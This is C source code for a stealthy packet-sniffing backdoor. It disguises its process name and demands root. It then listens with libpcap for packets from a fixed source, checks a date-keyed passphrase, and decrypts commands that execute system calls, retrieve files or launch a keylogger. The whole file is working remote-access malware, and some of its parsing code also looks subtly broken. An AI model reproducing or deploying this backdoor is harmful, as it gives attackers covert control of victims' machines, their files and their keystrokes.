#include "server.h"

// Function prototypes
void backdoor();
void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
int validPassphrase(char *passphrase);
void getCommand(char **command, int payloadSize);

int main (int argc, char* argv[])
{
    // Hide the process by giving it a generic name
    strcpy(argv[0], PROCESS_MASK);
    
    // Elevate to root status
    if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        systemFatal("You need to be root for this");
    }
    
    // Call function to listen behind the firewall
    backdoor();
    
    return 0;
}

void backdoor()
{
    char errorBuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char *filter = malloc(sizeof(char) * FILTER_BUFFER);
    pcap_t *handle;
    pcap_if_t *nics;
    pcap_if_t *nic;
    bpf_u_int32 net;
    bpf_u_int32 mask;
    
    // Get the devices on the machine
    if (pcap_findalldevs(&nics, errorBuffer) == -1)
    {
        systemFatal("Unable to retrieve device list");
    }
    
    // Find a suitable nic from the device list
    for (nic = nics; nic; nic = nic->next)
    {
        if (pcap_lookupnet(nic->name, &net, &mask, errorBuffer) != -1)
        {
            break;
        }
    }
    
    // Open the session
    handle = pcap_open_live(nic->name, SNAP_LEN, 0, 0, errorBuffer);
    if (handle == NULL)
    {
        systemFatal("Unable to open live capture");
    }
    
    // Create and parse the filter to the capture
    snprintf(filter, FILTER_BUFFER, "src %s and src port %s", SOURCE_IP, SOURCE_PORT_STRING);
    if (pcap_compile(handle, &fp, filter, 0, net) == -1)
    {
        systemFatal("Unable to compile filter");
    }
    
    // Set the filter on the listening device
    if (pcap_setfilter(handle, &fp) == -1)
    {
        systemFatal("Unable to set filter");
    }
    
    // Call pcap_loop and process packets as they are received
    if (pcap_loop(handle, -1, receivedPacket, NULL) == -1)
    {
        systemFatal("Error in pcap_loop");
    }
    
    // Clean up
    free(filter);
    pcap_freecode(&fp);
    pcap_close(handle);
}

void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    const struct ip *iph = NULL;
    const struct tcphdr *tcph = NULL;
    char *passphrase = NULL;
    char *payload = NULL;
    int ipHeaderSize = 0;
    int tcpHeaderSize = 0;
    int payloadSize = 0;
    
    // Get the IP header and offset value
    iph = (struct ip*)(packet + SIZE_ETHERNET);
#ifdef _IP_VHL
    ipHeaderSize = IP_VHL_HL(iph->ip_vhl) * 4;
#else
    ipHeaderSize = iph->ip_hl * 4;
#endif
    
    if (ipHeaderSize < 20)
    {
        return;
    }
    
    // Ensure that we are dealing with one of our sneaky TCP packets
    if (iph->ip_p == IPPROTO_TCP)
    {
        // Get our TCP packet and the header size
        tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + ipHeaderSize);
        
#ifdef __APPLE__ & __MACH__
        tcpHeaderSize = tcph->th_off * 4;
#else
        tcpHeaderSize = tcph->doff * 4;
#endif
        
        // Grab the code out of the packet
        passphrase = malloc(sizeof(char) * 4);
        memcpy(passphrase, (packet + SIZE_ETHERNET + ipHeaderSize + 4), sizeof(__uint32_t));
        
        // Decode the passphrase
        if (!validPassphrase(passphrase))
        {
            free(passphrase);
            return;
        }
        
        // Passphrase must match, so grab the encrypted command from the payload
#ifdef _IP_VHL
        payloadSize = ntohs(iph->ihl) - (ipHeaderSize + tcpHeaderSize);
#else
        payloadSize = ntohs(iph->ip_hl) - (ipHeaderSize + tcpHeaderSize);
#endif
        payload = (char*)(packet + SIZE_ETHERNET + ipHeaderSize + tcpHeaderSize);
        
        // Get the command and execute it
        getCommand(&payload, payloadSize);
        
    }
    
    // Perform cleanup for any allocated memory
    free(passphrase);
    
}

int validPassphrase(char *passphrase)
{
    char *decryptedPhrase = NULL;
    char date[11];
    struct tm *tm;
    time_t t;
    
    // Get the date information
    time(&t);
    tm = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", tm);
    
    // Decrypt our passphrase using today's date
    decryptedPhrase = encrypt_data(passphrase, date, 4);
    
    // Check if the passphrase is correct
    if(strncmp(decryptedPhrase, PASSPHRASE, 4) == 0)
    {
        return 1;
    }

    return 0;
}

void getCommand(char **command, int payloadSize)
{
    char *decryptedCommand = NULL;
    char *token = NULL;
    char date[11];
    struct tm *tm;
    int option = -1;
    time_t t;
    
    // Get the date information
    time(&t);
    tm = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", tm);
    
    // Decrypt our command using today's date
    decryptedCommand = encrypt_data(*command, date, payloadSize);
    
    // Get the command value and an optional filename or command
    if (sscanf(decryptedCommand, "%d[^|]%s", &option, token) == 0)
    {
        return;
    }
    
    switch (option) {
        case EXECUTE_SYSTEM_CALL:
            executeSystemCall(token);
            break;
        case FIND_FILE:
            retrieveFile(token);
            break;
        case KEYLOGGER:
            keylogger();
            break;
        default:
            break;
    }
}
